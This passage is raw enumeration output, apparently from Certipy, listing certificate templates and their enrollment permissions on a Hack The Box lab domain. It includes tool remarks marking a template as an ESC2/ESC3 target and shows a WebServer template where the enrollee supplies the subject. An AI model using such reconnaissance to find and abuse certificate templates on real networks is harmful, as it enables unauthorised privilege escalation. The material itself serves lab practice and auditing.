                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  13
    Template Name                       : IPSECIntermediateOffline
    Display Name                        : IPSec (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  14
    Template Name                       : IPSECIntermediateOnline
    Display Name                        : IPSec
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
  15
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  16
    Template Name                       : CA
    Display Name                        : Root Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
  18
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Controllers
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\Enterprise Domain Controllers
  19
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  20
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  21
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  22
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  23
    Template Name                       : CTLSigning
    Display Name                        : Trust List Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Microsoft Trust List Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  24
    Template Name                       : CodeSigning
    Display Name                        : Code Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  25
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  26
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  27
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
  28
    Template Name                       : SmartcardLogon
    Display Name                        : Smartcard Logon
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Extended Key Usage                  : Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  29
    Template Name                       : ClientAuth
    Display Name                        : Authenticated Session
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
  30
    Template Name                       : SmartcardUser
    Display Name                        : Smartcard User
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Extended Key Usage                  : Secure Email
                                          Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  31
    Template Name                       : UserSignature
    Display Name                        : User Signature Only
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
  32
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
